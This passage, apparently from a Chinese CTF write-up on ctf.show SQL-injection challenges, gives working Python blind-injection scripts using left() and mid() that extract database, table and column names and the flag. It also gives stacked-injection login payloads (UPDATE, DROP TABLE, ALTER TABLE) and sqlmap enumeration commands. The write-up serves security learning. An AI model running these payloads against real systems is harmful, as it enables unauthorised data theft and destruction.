title="补充:substr()替换函数"></a>补充:substr()替换函数</h3><p>注:[]表示可选</p><p> <strong>left(str,length)从左边开始截取length个长度</strong></p><p> <strong>right(str,length)从右边开始截取length个长度</strong></p><p> <strong>substring(str,index,[length])从左边index开始截取length个长度，无length时默认提取到结尾</strong></p><p> <strong>mid(str,index,length)截取str从index开始，截取length的长度</strong></p><p> <strong>lpad(str,len,padstr)在str的左边填充给定的padstr到指定的长度len，返回填充的结果</strong></p><p> <strong>rpad(str,len,padstr)在str的右边填充给定的padstr到指定的长度len，返回填充的结果</strong></p><hr><h3 id="注入过程-2"><a href="#注入过程-2" class="headerlink" title="注入过程"></a>注入过程</h3><p>这里使用left，但是left是从左边开始提取全部字符，比如left(‘123456’,3)&#x3D;123</p><p>注意，这里的表名变了，所以平时一定要一步步来</p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://f64165e4-5ed1-4314-b82e-979035a7b676.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">database_name =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and left(database(),&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database_name += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(database_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;库名为: &#x27;</span>+ <span class="built_in">str</span>(database_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228180049018.png" alt="image-20241228180049018"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://f64165e4-5ed1-4314-b82e-979035a7b676.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">table_name =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and left((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            table_name += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;表名为: &#x27;</span>+ <span class="built_in">str</span>(table_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228181354393.png" alt="image-20241228181354393"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://f64165e4-5ed1-4314-b82e-979035a7b676.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">column_name =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            column_name += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(column_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;列名为: &#x27;</span>+ <span class="built_in">str</span>(column_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228181009760.png" alt="image-20241228181009760"></p><p>爆数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://f64165e4-5ed1-4314-b82e-979035a7b676.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and left((select f1ag from ctfshow_flxg),&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag为: &#x27;</span>+ <span class="built_in">str</span>(flag))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228181221635.png" alt="image-20241228181221635"></p><h2 id="web194-过滤-left-right"><a href="#web194-过滤-left-right" class="headerlink" title="web194(过滤+left,right)"></a>web194(过滤+left,right)</h2><p>使用mid()函数进行盲注</p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d1f5521e-1620-4565-a873-ed76421247a8.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">database_name =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and mid(database(),1,&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database_name += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(database_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;库名为: &#x27;</span>+ <span class="built_in">str</span>(database_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228182142446.png" alt="image-20241228182142446"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d1f5521e-1620-4565-a873-ed76421247a8.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">table_name =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),1,&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            table_name += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;表名为: &#x27;</span>+ <span class="built_in">str</span>(table_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228182349867.png" alt="image-20241228182349867"></p><p>爆列名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d1f5521e-1620-4565-a873-ed76421247a8.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">column_name =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),1,&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            column_name += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(column_name)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;列名为: &#x27;</span>+ <span class="built_in">str</span>(column_name))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228182504350.png" alt="image-20241228182504350"></p><p>爆数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d1f5521e-1620-4565-a873-ed76421247a8.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&quot;&quot;</span></span><br><span class="line">str1 =<span class="string">&quot;&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_,&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    found_character = <span class="literal">False</span>  <span class="comment"># 标志变量，用于跟踪当前字符是否找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str2:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and mid((select f1ag from ctfshow_flxg),1,&#123;&#125;)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,str1+j), <span class="comment">#通过str1+j来进行比较,并且要使用format进行格式化</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            str1 += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            found_character = <span class="literal">True</span>  <span class="comment"># 标记字符已找到</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">     <span class="comment"># 如果在当前循环中没有找到字符，结束外层循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_character:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到更多字符，结束循环。&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag为: &#x27;</span>+ <span class="built_in">str</span>(flag))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228182758997.png" alt="image-20241228182758997"></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="web195-过滤空格和"><a href="#web195-过滤空格和" class="headerlink" title="web195(过滤空格和*)"></a>web195(过滤空格和*)</h2><p>注意到过滤空格和*，由题目可知登录成功即获得flag，提交的用户名为0时显示密码错误，因此用堆叠注入更改密码</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username：<span class="number">0</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">1</span></span><br><span class="line">password：<span class="number">1</span></span><br><span class="line">提交两次可获得flag，第一次更改，第二次登录</span><br><span class="line">注意pass后也有`</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241228190813527.png" alt="image-20241228190813527"></p><h2 id="web196-伪过滤select"><a href="#web196-伪过滤select" class="headerlink" title="web196(伪过滤select)"></a>web196(伪过滤select)</h2><p>此处由题目来说是过滤了select的，但是实际并没有，就可以通过select来进行堆叠注入</p><p>判断条件为<code>$row[0]==$password</code>，row[0]就是结果这一行的第一个数据</p><p>payload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">select</span>(<span class="number">1</span>)</span><br><span class="line">password:<span class="number">1</span></span><br><span class="line">原理为<span class="type">row</span>[<span class="number">0</span>]处理<span class="keyword">select</span>(<span class="number">1</span>)时就会返回<span class="number">1</span>，即$<span class="type">row</span>[<span class="number">0</span>]<span class="operator">=</span><span class="operator">=</span><span class="number">1</span>，和密码匹配</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229172406452.png" alt="image-20241229172406452"></p><h2 id="web197-select"><a href="#web197-select" class="headerlink" title="web197(+select)"></a>web197(+select)</h2><p>这个题将select确实过滤，由于判断条件是登录表中用户，则可通过删除表中数据再重新添加实现</p><p>payload为(三选一均可)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username:<span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;#删除原来的表ctfshow_user</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> ctfshow_user(username <span class="type">varchar</span>(<span class="number">100</span>),pass <span class="type">varchar</span>(<span class="number">100</span>)); #在ctfshow_user中新建两个最大长度为<span class="number">100</span>的字段</span><br><span class="line"><span class="keyword">insert</span> ctfshow_user(username,pass) <span class="keyword">value</span> (<span class="number">1</span>,<span class="number">2</span>); #为这两个字段赋值为<span class="number">1</span>和<span class="number">2</span></span><br><span class="line"></span><br><span class="line">完整payload:</span><br><span class="line">username:<span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;<span class="keyword">create</span> <span class="keyword">table</span> ctfshow_user(username <span class="type">varchar</span>(<span class="number">100</span>),pass <span class="type">varchar</span>(<span class="number">100</span>));<span class="keyword">insert</span> ctfshow_user(username,pass) <span class="keyword">value</span> (<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">password:<span class="number">2</span></span><br><span class="line"></span><br><span class="line">也可以通过alert的方法实现</span><br><span class="line">username:<span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user <span class="keyword">drop</span> pass;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user <span class="keyword">add</span> pass <span class="type">int</span> <span class="keyword">default</span> <span class="number">1</span></span><br><span class="line">password:<span class="number">1</span></span><br><span class="line"></span><br><span class="line">看wp还有一种和上题思路类似的</span><br><span class="line">username:<span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line">password:ctfshow_user</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229174034261.png" alt="image-20241229174034261"></p><h2 id="web198-create"><a href="#web198-create" class="headerlink" title="web198(+create)"></a>web198(+create)</h2><p>把上题的create禁用了，因此可用insert(插入)方法</p><p>payload为(二选一即可)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username:<span class="number">1</span>;<span class="keyword">insert</span> ctfshow_user(username,pass) <span class="keyword">value</span>(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">password:<span class="number">2</span></span><br><span class="line">原理为向表中插入一组数据，登录即可</span><br><span class="line"></span><br><span class="line">username:<span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line">password:ctfshow_user</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229175046121.png" alt="image-20241229175046121"></p><h2 id="web199"><a href="#web199" class="headerlink" title="web199(+())"></a>web199(+())</h2><p>把括号禁用，还可以用表名</p><p>patload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line">password:ctfshow_user</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229174926296.png" alt="image-20241229174926296"></p><h2 id="web200"><a href="#web200" class="headerlink" title="web200(+,)"></a>web200(+,)</h2><p>过滤逗号，和上题一样的思路</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line">password:ctfshow_user</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229175241800.png" alt="image-20241229175241800"></p><h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><h2 id="web201-UA-referer检查"><a href="#web201-UA-referer检查" class="headerlink" title="web201(UA,referer检查)"></a>web201(UA,referer检查)</h2><p>首先根据题目要指定agent和绕过referer检查，因此构造payload(-batch为自动选择)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --referer http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/sqlmap.php -batch</span><br><span class="line">检测注入点，如下图，未指定UA也可以，可以进行时间盲注和union注入</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229183828645.png"></p><p>爆库名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --referer http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/sqlmap.php -batch -dbs</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229193257761.png" alt="image-20241229193257761"></p><p>爆表名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --referer http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/sqlmap.php -batch -D ctfshow_web -tables</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229193440541.png" alt="image-20241229193440541"></p><p>爆列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://8c812db9-acb0-4e05-9b19-410e57bfaf5f.challenge.ctf.show/api/?id=1 --referer http://8c812db9-acb0-4e05-9b19-410e57bfaf5f.challenge.ctf.show/sqlmap.php -batch -D ctfshow_web -T ctfshow_user -columns</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229193656170.png" alt="image-20241229193656170"></p><p>爆数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://8c812db9-acb0-<span class="number">4e05</span>-9b19-<span class="number">4</span>10e57bfaf5f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --referer http://8c812db9-acb0-<span 